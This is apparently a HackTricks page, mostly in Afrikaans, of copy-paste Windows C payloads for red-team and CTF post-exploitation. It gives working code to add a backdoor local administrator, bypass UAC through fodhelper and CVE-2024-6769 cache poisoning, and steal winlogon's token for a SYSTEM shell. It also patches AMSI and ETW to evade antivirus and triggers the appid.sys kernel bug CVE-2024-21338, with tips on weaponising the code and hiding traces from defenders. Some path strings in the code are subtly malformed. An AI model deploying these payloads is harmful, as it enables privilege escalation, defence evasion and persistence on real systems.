# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

Hierdie bladsy versamel **klein, selfstandige C-snippets** wat handig is tydens Windows Local Privilege Escalation of post-exploitation.  Elke payload is ontwerp om **copy-paste friendly** te wees, vereis slegs die Windows API / C runtime, en kan saamgestel word met `i686-w64-mingw32-gcc` (x86) of `x86_64-w64-mingw32-gcc` (x64).

> ⚠️  Hierdie payloads neem aan dat die proses reeds die minimum voorregte het wat benodig word om die aksie uit te voer (bv. `SeDebugPrivilege`, `SeImpersonatePrivilege`, of 'n medium-integrity-konteks vir 'n UAC bypass). Hulle is bedoel vir **red-team or CTF settings** waar die uitbuiting van 'n vulnerability tot arbitraire native code execution gelei het.

---

## Add local administrator user
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integriteit)
Wanneer die vertroude binêre **`fodhelper.exe`** uitgevoer word, voer dit 'n navraag uit op die registerpad hieronder **sonder om die `DelegateExecute` werkwoord te filter**. Deur ons opdrag onder daardie sleutel te plant, kan 'n aanvaller UAC omseil *sonder* om 'n lêer op die skyf neer te sit.

*Registerpad wat deur `fodhelper.exe` opgevra word*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
'n minimale PoC wat 'n verhoogde `cmd.exe` oopmaak:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Getoets op Windows 10 22H2 en Windows 11 23H2 (July 2025 patches). Die bypass werk steeds omdat Microsoft nie die ontbrekende integriteitskontrole in die `DelegateExecute`-pad reggestel het nie.*

---

## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
Drive remapping + activation context cache poisoning werk steeds teen gepatchede Windows 10/11-boues omdat `ctfmon.exe` as 'n hoë-integriteits vertroude UI-proses loop wat graag vanaf die oproeper se geïmpersonifiseerde `C:`-skyf laai en hergebruik wat ook al DLL-omleidings `CSRSS` in die kas het. Misbruik verloop soos volg: herlei `C:` na aanvallerbeheerde stoorplek, plaas 'n getrojaniseerde `msctf.dll`, laai `ctfmon.exe` om hoë integriteit te verkry, en vra dan `CSRSS` om 'n manifest in die kas te sit wat 'n DLL herlei wat deur 'n auto-elevated binary gebruik word (bv. `fodhelper.exe`), sodat die volgende opstart jou payload erft sonder 'n UAC-prompt.

Praktiese werkvloei:
1. Bereid 'n vals %SystemRoot%\System32-boom voor en kopieer die wettige binêr wat jy wil kaap (dikwels `ctfmon.exe`).
2. Gebruik `DefineDosDevice(DDD_RAW_TARGET_PATH)` om `C:` binne jou proses te herlei, en hou `DDD_NO_BROADCAST_SYSTEM` sodat die verandering plaaslik bly.
3. Plaas jou DLL + manifest in die vals boom, roep `CreateActCtx/ActivateActCtx` om die manifest in die activation-context cache te druk, en laai dan die auto-elevated binary sodat dit die herleide DLL direk na jou shellcode oplos.
4. Verwyder die kasinskrywing (`sxstrace ClearCache`) of herlaai wanneer klaar om aanvallervingerafdrukke uit te vee.

<details>
<summary>C - Vals skyf + manifest poison helper (CVE-2024-6769)</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (h == INVALID_HANDLE_VALUE) return FALSE;
DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
CloseHandle(h);
return ok;
}

int wmain(void) {
const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
SHCreateDirectoryExW(NULL, stage, NULL);
CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);

DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
L"C:", L"\\??\\C:\\Users\\Public\\fakeC");

const wchar_t manifest[] =
L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
L" <dependency><dependentAssembly>"
L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
L" </dependentAssembly></dependency></assembly>";
WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);

ACTCTXW act = { sizeof(act) };
act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
ULONG_PTR cookie = 0;
HANDLE ctx = CreateActCtxW(&act);
ActivateActCtx(ctx, &cookie);

STARTUPINFOW si = { sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

WaitForSingleObject(pi.hProcess, 2000);
DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
return 0;
}
```
</details>

Opruimwenk: nadat jy SYSTEM gepop het, roep `sxstrace Trace -logfile %TEMP%\sxstrace.etl` gevolg deur `sxstrace Parse` tydens toetsing — as jy jou manifest-naam in die log sien, kan verdedigers dit ook, so roteer die paaie elke keer.

---

## Begin 'n SYSTEM-shell deur tokenduplisering (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
As die huidige proses **albei** `SeDebug` en `SeImpersonate` voorregte het (tipies vir baie diensrekeninge), kan jy die token van `winlogon.exe` steel, dit dupliseer, en 'n verhoogde proses begin:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Vir 'n dieper verduideliking van hoe dit werk, sien:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## In-geheue AMSI & ETW Patch (Defence Evasion)
Die meeste moderne AV/EDR-enjins vertrou op **AMSI** en **ETW** om kwaadwillige gedrag te ondersoek. Deur beide koppelvlakke vroeg in die huidige proses te patch, voorkom dit dat skripgebaseerde payloads (bv. PowerShell, JScript) geskandeer word.
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*Die pleister hierbo is proses-lokaal; spawning 'n nuwe PowerShell nadat dit uitgevoer is, sal sonder AMSI/ETW-inspeksie uitgevoer word.*

---

## Skep subproses as Protected Process Light (PPL)
Versoek 'n PPL-beskermingsvlak vir 'n subproses tydens skepping deur `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL` te gebruik. Dit is 'n gedokumenteerde API en sal slegs slaag as die teiken-beeld onderteken is vir die versoekte signer-klasse (Windows/WindowsLight/Antimalware/LSA/WinTcb).
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
Levels used most commonly:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Validate the result with Process Explorer/Process Hacker by checking the Protection column.

---

## Local Service -> Kernel via `appid.sys` Smart-Hash (`IOCTL 0x22A018`, CVE-2024-21338)
`appid.sys` openbaar 'n device object (`\\.\\AppID`) waarvan die smart-hash-onderhoud IOCTL gebruikers-geskepte funksie-aanwysers aanvaar wanneer die caller as `LOCAL SERVICE` loop; Lazarus misbruik dit om PPL uit te skakel en willekeurige drivers te laai, so red teams behoort 'n kant-en-klare trigger vir lab-gebruik te hê.

Bedryfsnotas:
- Jy het steeds 'n `LOCAL SERVICE` token nodig. Steel dit vanaf `Schedule` of `WdiServiceHost` deur `SeImpersonatePrivilege` te gebruik, en impersonate voordat jy die device aanraak sodat ACL-checks slaag.
- IOCTL `0x22A018` verwag 'n struct wat twee callback-aanwysers (query length + read function) bevat. Wys albei na user-mode stubs wat 'n token-overskrywing of map van ring-0 primitives saamstel, maar hou die buffers RWX sodat KernelPatchGuard nie mid-chain crash nie.
- Na sukses, stop impersonation en revert die device-handle; defenders kyk nou vir onverwagte `Device\\AppID` handles, so sluit dit onmiddellik sodra privilege verkry is.

<details>
<summary>C - Skelet-trigger vir `appid.sys` smart-hash abuse</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef struct _APPID_SMART_HASH {
ULONGLONG UnknownCtx[4];
PVOID QuerySize;   // called first
PVOID ReadBuffer;  // called with size returned above
BYTE  Reserved[0x40];
} APPID_SMART_HASH;

DWORD WINAPI KernelThunk(PVOID ctx) {
// map SYSTEM shellcode, steal token, etc.
return 0;
}

int wmain(void) {
HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
if (hDev == INVALID_HANDLE_VALUE) {
printf("[-] CreateFileW failed: %lu\n", GetLastError());
return 1;
}

APPID_SMART_HASH in = {0};
in.QuerySize = KernelThunk;
in.ReadBuffer = KernelThunk;

DWORD bytes = 0;
if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
}
CloseHandle(hDev);
return 0;
}
```
</details>

Minimale fix-up vir 'n weaponized build: map 'n RWX-seksie met `VirtualAlloc`, kopieer jou token duplication stub daarheen, stel `KernelThunk = section`, en sodra `DeviceIoControl` terugkeer behoort jy SYSTEM te wees selfs onder PPL.

---

## Verwysings
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)
* CreateProcessAsPPL – minimal PPL process launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
* Microsoft Docs – STARTUPINFOEX / InitializeProcThreadAttributeList / UpdateProcThreadAttribute
* DarkReading – ["Novel Exploit Chain Enables Windows UAC Bypass"](https://www.darkreading.com/vulnerabilities-threats/windows-activation-context-cache-elevation) (2024)
* Avast Threat Labs – ["Lazarus Deploys New FudModule Rootkit"](https://decoded.avast.io/threatresearch/lazarus-deploys-new-fudmodule-rootkit/) (2024)

{{#include ../../banners/hacktricks-training.md}}
